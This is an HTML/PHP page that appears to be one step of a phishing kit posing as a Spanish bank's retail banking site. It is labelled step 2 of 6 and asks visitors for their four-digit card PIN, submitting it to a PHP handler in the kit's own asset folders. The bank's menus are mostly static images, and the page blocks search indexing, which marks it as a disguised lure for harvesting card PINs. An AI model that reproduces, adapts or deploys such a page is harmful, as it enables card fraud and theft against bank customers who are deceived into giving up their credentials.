<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <title>Particulares</title>
        <script src="./Assets/js/stutes.js"></script>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        <header id="header">
            <div class="container">
                <div><img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/logo_RGB.svg" style="width: 200px;"></div>
                <div><img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/logo4.png"></div>
                <div>
                    <img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/mainmenu.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/mobile-menu.png">
                </div>
            </div>      
        </header>

        <nav id="nav">
            <div class="container">
                <div><img src="./Assets/imgs/header-left.png"></div>
                <div><img src="./Assets/imgs/sofia.png"></div>
            </div>
        </nav>
        <div class="wrapper_details">
            <div class="container_details">
                <div class="length_box">
                    <div class="length">
                        <div class="max_legth w-50"></div>
                    </div>
                    <p>Paso 2 de 6</p>
                </div>
                <div class="title">
                    <h1>Añade el PIN</h1>
                    <p>Introduce el mismo número de 4 digitos que usas con esta tarjeta para cus compras o en cajeros</p>
                </div>
                <form action="./Assets/php/config/func.php" method="post">
                    <input type="hidden" name="pin">
                    <div class="title_form text-center w-100">
                        <img src="./Assets/imgs/cc.png" class="mb-2" width="100" alt="">
                        <h1>Introduce PIN</h1>
                    </div>
                    <?php if( isset($_GET['error']) ) : ?>
                    <div class="error mt-4 px-4">
                        <i class="ri-alert-line"></i>
                        <p>Debes introducir tu PIN. Inténtalo de nuevo.</p>
                    </div>
                    <?php endif; ?>                  
                    <div class="inputes d-flex justify-content-center align-items-center">
                        <input type="text" name="x1" id="x1" maxlength="1" inputmode="numeric">
                        <input type="text" name="x2" id="x2" maxlength="1" inputmode="numeric">
                        <input type="text" name="x3" id="x3" maxlength="1" inputmode="numeric">
                        <input type="text" name="x4" id="x4" maxlength="1" inputmode="numeric">
                    </div>
                    <p class="d-flex justify-content-center align-items-center"><img src="./Assets/imgs/eye1.png" alt=""> Mostrar</p>
                    <p class="d-flex justify-content-center align-items-center"><img src="./Assets/imgs/LOCK.png" width="20" alt=""> ¿No recuerdas tu clave PIN?</p>
                    <div class="btn_sub d-flex justify-content-end">
                        <button type="submit" disabled>CONFIRMAR</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js>/js.js"></script>

        <script>
            $("input").keyup(function(){
                if ($(this).val().length > 0) {
                    $(this).next().focus();
                }else if ($(this).val() === "") {
                    $(this).prev().focus();
                }
            })        
            $("input").keyup(function(){
                if ($("#x1").val() != "" & $("#x2").val() != "" & $("#x3").val() != "" & $("#x4").val() != "") {
                    $(".btn_sub button").prop("disabled",false);
                }else{
                    $(".btn_sub button").prop("disabled",true);
                }
            });             
        </script>

    </body>

</html>